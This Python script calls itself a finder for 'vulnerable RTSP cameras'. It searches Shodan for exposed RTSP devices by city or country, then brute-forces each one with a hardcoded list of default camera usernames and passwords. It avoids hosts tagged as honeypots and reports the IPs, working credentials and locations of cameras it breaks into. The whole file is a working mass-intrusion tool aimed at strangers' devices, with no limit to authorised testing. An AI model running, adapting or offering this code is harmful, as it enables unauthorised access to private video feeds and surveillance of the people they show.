#!/bin/env python3
import sys
import os
import shodan
import argparse
import cv2
import threading
import time
from queue import Queue
from prettytable import PrettyTable
from colorama import init, Fore
from tqdm import tqdm

# Initialize Colorama
init()

# Force TCP for stability
os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "rtsp_transport;tcp"

# --- Constants & Configuration ---
COLOURS = {
    "warning": "\u001b[38;5;220m",
    "success": "\u001b[38;5;46m",
    "info": "\u001b[38;5;39m",
    "error": "\u001b[38;5;160m",
    "reverse": "\u001b[7m",
    "reset": "\u001b[0m"
}

def log(msg, level="info"):
    color = COLOURS.get(level, COLOURS["info"])
    print(f'[{COLOURS["reverse"]}{color}{level.upper()[0]}{COLOURS["reset"]}] {msg}')

def get_args():
    parser = argparse.ArgumentParser(description='Find Vulnerable RTSP Cameras')
    parser.add_argument('apikey', help='Shodan API Key')
    parser.add_argument('-t', '--threads', type=int, default=15)
    parser.add_argument('--city', help='Filter by city')
    parser.add_argument('--country', help='Filter by country code (e.g., US)')
    return parser.parse_args()

def build_query(city, country):
    query = "rtsp"
    if country: query += f' country:"{country}"'
    if city: query += f' city:"{city}"'
    return query

def check_rtsp_auth(ip, credentials):
    """Probes a camera for valid credentials with timeout handling."""
    for cred in credentials:
        url = f'rtsp://{cred}@{ip}' if cred else f'rtsp://{ip}'
        
        # Use a short timeout approach
        cap = cv2.VideoCapture(url)
        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        
        # Give it a short time to connect
        start_time = time.time()
        ret, _ = cap.read()
        cap.release()
        
        # If read() succeeded quickly, we assume success
        if ret:
            return cred if cred else "No Auth Required"
            
    return None

def worker_thread(q, results_list, lock):
    usernames = ["", "admin", "Admin", "Administrator", "root", "supervisor", "ubnt", "service", "Dinion", "administrator", "admin1"]
    passwords = ["", "admin", "9999", "123456", "pass", "camera", "1234", "12345", "fliradmin", "system", "jvc", "meinsm", "root", "4321", "111111", "1111111", "password", "ikwd", "supervisor", "ubnt", "wbox123", "service"]
    
    while True:
        target = q.get()
        ip = target["ip_str"]
        
        if "honeypot" not in str(target):
            found_auth = None
            # Nested loop to test combinations
            for u in usernames:
                for p in passwords:
                    credential = f"{u}:{p}" if u else p
                    if check_rtsp_auth(ip, [credential]):
                        found_auth = credential
                        break 
                if found_auth:
                    break 

            if found_auth:
                with lock:
                    results_list.append({
                        "ip": ip, 
                        "auth": found_auth, 
                        "city": target["location"].get("city", "N/A"),
                        "country": target["location"].get("country_name", "N/A")
                    })
        q.task_done()

def main():
    args = get_args()
    api = shodan.Shodan(args.apikey)
    query = build_query(args.city, args.country)

    try:
        log(f"Searching Shodan for: {query}")
        results = api.search(query)
    except Exception as e:
        log(f"API Error: {e}", "error")
        return

    targets = results['matches']
    log(f"Found {len(targets)} targets. Starting probe...")
    
    q = Queue()
    vulnerable_cams = []
    lock = threading.Lock()

    # Start threads
    for _ in range(args.threads):
        t = threading.Thread(target=worker_thread, args=(q, vulnerable_cams, lock), daemon=True)
        t.start()

    # Submit targets to queue with progress bar
    for target in tqdm(targets, desc="Probing Cameras", unit="cam"):
        q.put(target)

    q.join()

    # Final Report
    table = PrettyTable(["IP", "Auth Found", "Country", "City"])
    for cam in vulnerable_cams:
        table.add_row([cam["ip"], cam["auth"], cam["country"], cam["city"]])
    
    print("\n--- Final Results ---")
    print(table)

if __name__ == "__main__":
    main()
